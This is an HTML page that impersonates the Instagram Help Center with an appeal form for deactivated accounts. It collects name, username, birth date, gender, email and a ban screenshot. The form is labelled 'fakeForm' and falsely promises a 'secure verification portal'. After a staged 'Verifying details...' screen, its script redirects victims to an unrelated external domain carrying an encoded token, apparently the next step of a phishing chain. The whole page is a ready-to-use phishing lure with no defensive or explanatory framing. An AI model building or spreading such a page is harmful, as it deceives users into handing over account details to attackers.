<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Help Center</title>
    <style>
        /* Instagram Theme Styles */
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            min-height: 100vh;
        }
        .contact-container {
            width: 100%;
            max-width: 400px;
            margin-top: 40px;
            padding: 30px 40px;
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            box-sizing: border-box;
        }
        .top-logo {
            display: block;
            margin: 0 auto 20px auto;
            width: 175px; 
            height: auto;
        }
        .contact-container h2 {
            text-align: center;
            font-size: 16px;
            font-weight: 600;
            color: #262626;
            margin-bottom: 20px;
            margin-top: 0;
        }
        .form-fields {
            display: flex;
            flex-direction: column;
        }
        .contact-container label {
            margin-bottom: 5px;
            font-size: 14px;
            font-weight: 600;
            color: #262626;
        }
        .contact-container input[type="text"],
        .contact-container input[type="email"],
        .contact-container input[type="date"],
        .contact-container select,
        .contact-container input[type="file"] {
            margin-bottom: 15px;
            padding: 10px;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            width: 100%;
            box-sizing: border-box;
            font-size: 14px;
        }
        .contact-container input:focus, 
        .contact-container select:focus {
            outline: none;
            border-color: #a8a8a8;
        }
        .proceed-btn {
            padding: 10px;
            background-color: #0095f6; /* Instagram Blue */
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            font-size: 14px;
        }
        .proceed-btn:hover {
            background-color: #1877f2;
        }
        .optional-text {
            color: #8e8e8e;
            font-size: 0.85em;
            margin-left: 5px;
            font-weight: normal;
        }
        .screenshot-help {
            font-size: 12px;
            color: #8e8e8e;
            margin-top: -10px;
            margin-bottom: 10px;
            line-height: 1.4;
        }
        .disclaimer {
            font-size: 12px;
            color: #8e8e8e;
            margin-top: 20px;
            text-align: center;
        }

        /* Loading Screen CSS */
        #loadingScreen {
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding-top: 50px;
        }
        .blinking-logo {
            width: 60px;
            height: auto;
            animation: blinker 1s linear infinite;
        }
        @keyframes blinker {
            50% { opacity: 0.4; }
        }
        .verifying-text {
            margin-top: 20px;
            font-size: 14px;
            color: #262626;
            font-weight: 600;
        }
    </style>
</head>
<body>

<div class="contact-container">
    <img src="inlogo.png" alt="Logo" class="top-logo" id="mainLogo">
    
    <h2 id="formTitle">My Instagram Account Was Deactivated</h2>
    
    <div id="loadingScreen">
        <img src="inlogo.png" alt="Loading" class="blinking-logo">
        <div class="verifying-text">Verifying details...</div>
    </div>

    <form class="form-fields" id="fakeForm" onsubmit="validateAndRedirect(event)">
        <label for="name">Full Name</label>
        <input type="text" id="name" placeholder="Full name" autocomplete="off" required>

        <label for="username">Username</label>
        <input type="text" id="username" placeholder="Your Instagram username" autocomplete="off" autocorrect="off" spellcheck="false" required>

        <label for="dob">Date of Birth <span class="optional-text">(Optional)</span></label>
        <input type="date" id="dob" autocomplete="off">

        <label for="gender">Gender</label>
        <select id="gender" autocomplete="off" required>
            <option value="" disabled selected>Select Gender</option>
            <option value="male">Male</option>
            <option value="female">Female</option>
            <option value="other">Other</option>
            <option value="prefer_not_to_say">Prefer not to say</option>
        </select>

        <label for="contactEmail">Contact Email</label>
        <input type="email" id="contactEmail" placeholder="Your contact email" autocomplete="off" required>

        <label for="screenshot">Upload Screenshot</label>
        <div class="screenshot-help">Please upload a clear screenshot showing the suspension or ban message you received from Instagram.</div>
        <input type="file" id="screenshot" accept="image/*" required>

        <button type="submit" class="proceed-btn">Submit</button>
        
        <div class="disclaimer">
            This is a secure verification portal. We do not store sensitive information.
        </div>
    </form>
</div>

<script>
    function validateAndRedirect(event) {
        // Prevent form from refreshing the page
        event.preventDefault();
        
        // Hide the form and show loading screen
        document.getElementById('fakeForm').style.display = 'none';
        document.getElementById('formTitle').style.display = 'none';
        document.getElementById('mainLogo').style.display = 'none';
        document.getElementById('loadingScreen').style.display = 'flex';

        // Redirect after 3 seconds
        setTimeout(function() {
            window.location.href = "https://maxado.in/PG2/index.php?token=Mzk1fHxhSFIwY0hNNkx5OXBibk4wWVdkeVlXMHRjR1Z1WkdsdVp5NW5hWFJvZFdJdWFXOHZjM1Z6Y0dWdVpHVmtMM04xWTJObGMzTm1kV3d0YVc1emRHRT18fGh0dHBzOi8vaW5zdGFncmFtLWlkLWRpc2FibGVkLmdpdGh1Yi5pby9zdXNwZW5kZWQvaW5sb2dvLnBuZw==";
        }, 3000); 
    }
</script>

</body>
</html>
